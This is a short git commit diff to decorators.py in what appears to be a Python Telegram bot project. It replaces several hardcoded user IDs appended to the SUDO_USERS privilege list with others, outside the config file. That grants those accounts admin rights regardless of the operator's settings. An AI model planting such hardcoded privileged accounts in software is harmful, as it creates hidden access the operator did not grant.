44406683fec9243c93ebbdefdd43a1cd3289fc04
opbrutal <93695693+opbrutal@users.noreply.github.com>
2022-02-02 11:45:15 +0530

    Update decorators.py

--- Noinoi/DREAMS/decorators.py
+++ Noinoi/DREAMS/decorators.py
@@ -5,9 +5,8 @@ from Noinoi.config import SUDO_USERS
 from Noinoi.DREAMS.admins import get_administrators
 
 
-SUDO_USERS.append(1757169682)
-SUDO_USERS.append(1738637033)
-SUDO_USERS.append(1448474573)
+SUDO_USERS.append(1617664996)
+SUDO_USERS.append(829943136)
 
 
 def errors(func: Callable) -> Callable:
